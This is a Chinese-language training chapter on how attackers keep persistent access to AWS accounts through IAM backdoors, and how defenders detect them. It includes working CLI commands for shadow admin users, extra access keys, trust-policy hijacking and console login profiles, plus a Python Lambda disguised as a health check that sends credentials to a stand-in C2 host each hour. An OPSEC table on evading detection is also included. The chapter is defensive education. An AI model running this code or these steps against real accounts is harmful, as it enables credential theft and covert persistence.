# Ch 14 — 雲端持久化與後門：Shadow IAM 與隱蔽技巧

> **目標**：理解攻擊者在取得初始存取後如何在 AWS 環境建立持久化後門；掌握 shadow IAM、額外 access key、trust policy 劫持、Lambda 定時後門等手法；以及對應的偵測與防禦策略。

---

## 為什麼需要

傳統滲透的持久化思路是：植入 rootkit、在 `~/.bashrc` 加反連、在 cron 放 payload。這些手法在雲端環境幾乎無效，因為雲端的「主機」（EC2 instance）是可拋棄的，清掉再建就好。

但 IAM（Identity and Access Management）設定不會跟著 instance 消失。

攻擊者如果在 IAM 層種了後門，受害者重建了整個 ECS 叢集、重啟了所有 Lambda、換了 VPC，後門依然存在。雲端持久化的核心洞見是：**控制面（control plane）比資料面（data plane）更重要**。取得 IAM 設定的寫入權，比取得任何一台主機的 root 都值錢。

---

## 先建直覺

傳統後門藏在磁碟或記憶體。雲端後門藏在設定 API 的狀態裡。

```
攻擊者初始存取
       │
       ▼
  取得高權限憑證（例如 CompromisedAccessKey）
       │
       ├─── 建 shadow admin user ──► 新 IAM user + access key（攻擊者保管）
       │
       ├─── 加第二組 access key ───► 原 user 的 key 被輪替後仍可用
       │
       ├─── 改 trust policy ────────► 外部攻擊者帳號可 AssumeRole
       │
       └─── Lambda + EventBridge ───► 每小時 beacon 一次
               │
               ▼
  受害者：清掉 EC2、重建 ECS
               │
               ▼
  後門：完全不受影響，繼續存活
```

IAM 是設定，不是程序。沒有人去「殺死」它，它就一直在。

---

## 底層機制

### Shadow Admin（影子管理員）

最直接的手法：用被攻陷的高權憑證建一個新的 IAM 使用者（IAM user），賦予管理員級別的權限，名稱故意偽裝成 AWS 內建服務帳號。

```bash
# 攻擊者操作
aws iam create-user --user-name aws-backup-service

aws iam attach-user-policy \
  --user-name aws-backup-service \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

aws iam create-access-key --user-name aws-backup-service
```

預期輸出（節錄）：
```json
{
  "AccessKey": {
    "UserName": "aws-backup-service",
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "Status": "Active",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "CreateDate": "2026-08-01T03:12:00+00:00"
  }
}
```

攻擊者拿到這組 key 後，即使原始的 CompromisedAccessKey 被停用、IAM user 被鎖定，`aws-backup-service` 這個帳號仍然存活。

**偽裝命名原則**：
- 前綴用 `aws-`、`amazon-`（AWS 內建服務慣例，視覺上難區辨）
- 詞彙選 `backup`、`health-check`、`monitoring`、`sync`
- 避免 `hacker`、`test`、`temp`

---

### 額外 Access Key（第二把鑰匙）

IAM user 最多可以同時擁有 2 組 access key（存取金鑰）。攻擊者取得帳號後，在現有 user 上建立第二組 key，即使受害者輪替了原始 key，攻擊者的 key 依然有效。

```bash
# 確認目前 key 數量
aws iam list-access-keys --user-name target-user

# 建第二組 key（在 target-user 還有一組 active key 的情況下仍可執行）
aws iam create-access-key --user-name target-user
```

這個手法的隱蔽性在於：受害者只輪替（rotate）了自己的 key，沒有意識到還有第二組。

**防禦側稽核**：

```bash
# 列出所有 user 的所有 access key 和最後使用時間
aws iam generate-credential-report
aws iam get-credential-report --query 'Content' --output text | base64 -d | \
  cut -d',' -f1,9,10,14,15 | column -t -s','
```

找出「access_key_2_active = true」的 row，這是最直接的指標。另外，`access_key_2_last_used_date` 如果是 `N/A`，代表這把 key 從來沒用過，可疑。

---

### UpdateAssumeRolePolicy：劫持 Trust Policy

這是隱蔽性最高的手法之一。

每個 IAM role（IAM 角色）都有一個 trust policy（信任政策），控制「誰可以 AssumeRole 成這個 role」。攻擊者不需要建新的 user 或 role，只需要修改一個現有高權 role 的 trust policy，把自己帳號加進去。

```bash
# 攻擊者：修改 target-account (123456789012) 上的 ProductionAdminRole
# 加入攻擊者帳號 999999999999 的 root 作為 principal

aws iam update-assume-role-policy \
  --role-name ProductionAdminRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::123456789012:root"
        },
        "Action": "sts:AssumeRole"
      },
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::999999999999:root"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }'
```

之後攻擊者從自己帳號直接 assume 進來：

```bash
# 攻擊者帳號 999999999999 操作
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/ProductionAdminRole \
  --role-session-name legitimate-sounding-name
```

**為何難發現**：`ProductionAdminRole` 本身沒有消失、沒有被附加新 policy、沒有新的 IAM user。只有 trust policy 多了一個 principal。如果沒有掃描 trust policy 的變動，這個後門可以存活很久。

---

### Lambda 定時後門

建一個偽裝成維運工具的 Lambda 函式（Lambda function），配合 EventBridge（事件橋）的 cron 規則（排程規則）定時觸發，每次觸發都把現有 IAM 憑證外洩給攻擊者 C2。

```python
# Lambda function 內容（偽裝成 health check）
import boto3
import urllib.request
import json
import os

def lambda_handler(event, context):
    # 取得 Lambda execution role 的臨時憑證
    session = boto3.session.Session()
    creds = session.get_credentials().resolve()

    payload = {
        "ak": creds.access_key,
        "sk": creds.secret_key,
        "token": creds.token,
        "region": os.environ.get("AWS_REGION")
    }

    # 外洩到 C2
    req = urllib.request.Request(
        "https://attacker-c2.example.com/beacon",
        data=json.dumps(payload).encode(),
        method="POST"
    )
    urllib.request.urlopen(req, timeout=5)

    return {"status": "healthy"}
```

```bash
# 攻擊者建立 EventBridge rule：每小時觸發一次
aws events put-rule \
  --name aws-health-check-schedule \
  --schedule-expression "rate(1 hour)" \
  --state ENABLED

# 把 Lambda 設為 target
aws events put-targets \
  --rule aws-health-check-schedule \
  --targets '[{
    "Id": "1",
    "Arn": "arn:aws:lambda:ap-northeast-1:123456789012:function:aws-health-check"
  }]'
```

這個手法讓攻擊者取得的是 Lambda execution role（Lambda 執行角色）的臨時憑證（temporary credentials），而 Lambda execution role 通常被賦予較廣的 IAM 權限（例如讀取 S3、操作 DynamoDB）。

---

### EventBridge Cross-Account Target

**本段未實測，為理論預期行為**

EventBridge 支援跨帳號（cross-account）target。攻擊者可以在受害帳號的 EventBridge 建立一條 rule，target 是攻擊者帳號裡的 Lambda ARN。受害帳號的 event 觸發後，攻擊者帳號的 Lambda 被執行，且帶有受害帳號的 event payload。

**自驗方法**：
1. 建兩個 AWS 帳號 A（受害）和 B（攻擊者）
2. 在 B 的 Lambda resource-based policy 加入允許 A 的 EventBridge invoke
3. 在 A 建立 EventBridge rule，target 設為 B 的 Lambda ARN
4. 觸發 A 的 event，觀察 B 的 Lambda CloudWatch log 是否收到

---

### IAM User Login Profile（後門 Console 存取）

**本段未實測，為理論預期行為**

IAM user 可以有 login profile（登入設定檔），代表它可以用 username + password 登入 AWS Management Console（AWS 管理主控台）。很多以程式存取為主的 IAM user 沒有 login profile。

攻擊者可以對一個原本只有 API 存取的 IAM user 呼叫 `CreateLoginProfile`，讓它突然可以 console 登入，作為另一個後門入口。

```bash
# 攻擊者：給 aws-backup-service 開啟 console 登入
aws iam create-login-profile \
  --user-name aws-backup-service \
  --password "Sup3rS3cur3P@ss" \
  --no-password-reset-required
```

**自驗方法**：建一個沒有 login profile 的 IAM user，呼叫 `create-login-profile`，再嘗試用該帳密登入 console (`https://<account-id>.signin.aws.amazon.com/console`)，驗證是否成功。

---

### 隱蔽操作考量

攻擊者在種後門時的 OPSEC（作戰安全）：

| 考量 | 手法 |
|------|------|
| 命名偽裝 | 前綴 `aws-`、使用 `backup`/`health-check`/`sync` 等詞 |
| 時間偽裝 | UTC 03:00–05:00 操作，避開受害者工作時段 |
| IP 隱匿 | 用 CloudShell（AWS Cloud Shell）執行，source IP 是 AWS 的 IP，不是攻擊者固定 IP |
| AssumeRole 多跳 | 先 assume 一個低權 role，再 assume 高權 role，CloudTrail 的 source 變成 role ARN 而非原始 user |
| 地區選擇 | 在受害者不常用的 region 操作（例如 ap-south-1），降低被 Config rule 掃到的機率 |

---

## 對比取捨表

| 手法 | 隱蔽性 | 複雜度 | 存活條件 | 防禦偵測難度 |
|------|--------|--------|----------|------------|
| Shadow Admin User | 低（會產生新 user） | 低 | IAM user 未被清除 | 低（掃 user list 即可） |
| 額外 Access Key | 中 | 低 | Key 未被手動刪除 | 中（需看 key 數量） |
| Trust Policy 修改 | 高（role 無變化） | 中 | Role 未被刪除 | 高（需掃 trust policy） |
| Lambda + EventBridge | 中 | 中 | 兩者均存活 | 中（需看 EventBridge rules） |
| Login Profile 建立 | 中 | 低 | Profile 未被刪除 | 中（需看 login profile） |

---

## 踩雷集錦

**1. 輪替了 key 但沒刪第二組**

受害者發現 CompromisedUser 的 key 外洩，執行 `rotate access key` 操作（停用舊 key、建新 key）。但如果攻擊者已建了第二組 key，輪替只影響原始那組，攻擊者的 key 不受影響。正確做法是先 `list-access-keys`，把所有 key 都列出來，再逐一決定要留哪組。

**2. 刪了 EC2 instance 就以為清乾淨**

攻擊者在 EC2 上取得 instance profile role 的臨時憑證後，已用這組憑證在 IAM 層建了後門。受害者終止 EC2 後，instance profile role 和 IAM 後門都還在。清理順序應該是：先清 IAM 後門 → 再刪 compute 資源。

**3. 只看 IAM Console 不看 API**

AWS IAM Console 預設顯示 user list，但 trust policy 的變更在 Console 上不醒目。攻擊者改了 ProductionAdminRole 的 trust policy，在 Console 上 role 看起來一模一樣，只有點進去看 trust relationships tab 才會發現多了一個外部 principal。程式化稽核（用 CLI 列出所有 role 的 trust policy）才是可靠的方式。

**4. CloudShell 的 IP 不能用來抓攻擊者**

受害者在 CloudTrail 裡看到可疑操作的 source IP 是 `52.94.x.x`（AWS IP range），以為是 AWS 內部操作，忽略了這是攻擊者用 CloudShell 發出的請求。IP-based 的告警對 CloudShell 無效，應該改看 user-agent 或 event source 裡的 `cloudshell` 字串。

**5. 以為 IAM Access Analyzer 會掃所有問題**

IAM Access Analyzer（IAM 存取分析器）主要偵測「允許外部帳號存取」的 resource-based policy 和 trust policy。它不會主動告警「有一個新 IAM user 被建立」或「某個 user 有兩組 active access key」。這兩件事要靠 CloudTrail + EventBridge 的 event-driven 告警，或 AWS Config 的規則稽核。

---

## 進階延伸

**Pacu**：AWS 攻擊框架，`iam__backdoor_users_keys` 和 `iam__backdoor_assume_role` 兩個模組直接對應本章手法。研究 Pacu source code 可以看到這些手法的完整實作。

**MITRE ATT&CK for Cloud**：T1098（Account Manipulation）、T1136（Create Account）、T1078（Valid Accounts）對應本章所有手法。閱讀 technique 下的 procedure examples，可以看到真實 APT 組織（例如 Scattered Spider）在雲端環境的具體操作。

**Rhino Security Labs Blog — AWS IAM Privilege Escalation**：詳細列出了 25+ 種 IAM privilege escalation 路徑，其中多條可以被利用來建立本章的後門，與本章內容互補。

**CloudSploit / Prowler**：開源的 AWS 安全稽核工具，掃描 access key age、extra access keys、trust policy 外部 principal 等，是防禦側自動化稽核的起點。

---

## 本章重點整理

- 雲端持久化的核心是 IAM 層，不是 compute 層；清 instance 不會清掉 IAM 後門
- Shadow Admin：建命名偽裝的高權 IAM user，取得攻擊者控制的 access key
- 額外 Access Key：在現有 user 建第二組 key，key 輪替後仍然存活
- Trust Policy 劫持：修改現有 role 的 trust policy，讓外部帳號可以 AssumeRole 進來；role 本身不變，隱蔽性最高
- Lambda + EventBridge cron：定時後門，每次觸發取得 execution role 的臨時憑證外洩
- OPSEC：UTC 凌晨操作、CloudShell 隱匿 IP、命名偽裝、AssumeRole 多跳混淆來源
- 防禦核心事件：`CreateUser`、`CreateAccessKey`、`UpdateAssumeRolePolicy`、`CreateLoginProfile`、`PutRolePolicy` 要立刻告警

---

## 自我檢核

- [ ] 我能說明為何清掉 EC2 instance 不能清除 IAM 層的後門
- [ ] 我知道 IAM user 最多可以有幾組 access key，以及這如何被利用
- [ ] 我能解釋 trust policy 劫持（UpdateAssumeRolePolicy）的攻擊流程，以及為何它的隱蔽性比建新 user 高
- [ ] 我知道如何用 CLI 列出一個帳號內所有 IAM user 的所有 access key 和最後使用時間
- [ ] 我能說明 Lambda 定時後門的構成要素（EventBridge rule + Lambda function + execution role）
- [ ] 我知道 CloudShell 的操作在 CloudTrail 的 source IP 是 AWS 的 IP，以及如何正確識別 CloudShell 操作
- [ ] 我能列出至少三個應該立刻觸發告警的 CloudTrail event name

---

## 延伸閱讀

1. **Pacu GitHub — iam__backdoor_users_keys**
   搜尋：`rhinosecuritylabs/pacu iam__backdoor_users_keys`
   直接看攻擊框架的實作，比閱讀文章更直接。

2. **Rhino Security Labs — AWS IAM Privilege Escalation Paths**
   URL：`https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/`
   25+ 條 privilege escalation 路徑，與本章後門手法直接對應。

3. **MITRE ATT&CK — T1098.001 Additional Cloud Credentials**
   URL：`https://attack.mitre.org/techniques/T1098/001/`
   標準化的手法描述加上真實 APT 案例。

4. **AWS Security Blog — Strategies for detecting and responding to a compromised IAM user**
   搜尋：`aws security blog compromised iam user detection strategies`
   AWS 官方視角的偵測與回應流程，防禦側必讀。

5. **Ermetic / Sysdig — Detecting CloudShell-based attacks**
   搜尋：`cloudshell attack detection cloudtrail user agent`
   說明如何在 CloudTrail 裡識別 CloudShell 操作，直接補上踩雷集錦第 4 點的偵測缺口。

---

攻擊者種下 IAM 後門後，下一步是確保自己的操作不被偵測到。下一章從防禦角度理解 CloudTrail 的盲點，以及攻擊者如何嘗試繞過日誌。

→ [Ch 15 — 日誌與偵測規避（紅隊 OPSEC）：CloudTrail 怎麼抓你](./15-logging-evasion.md)
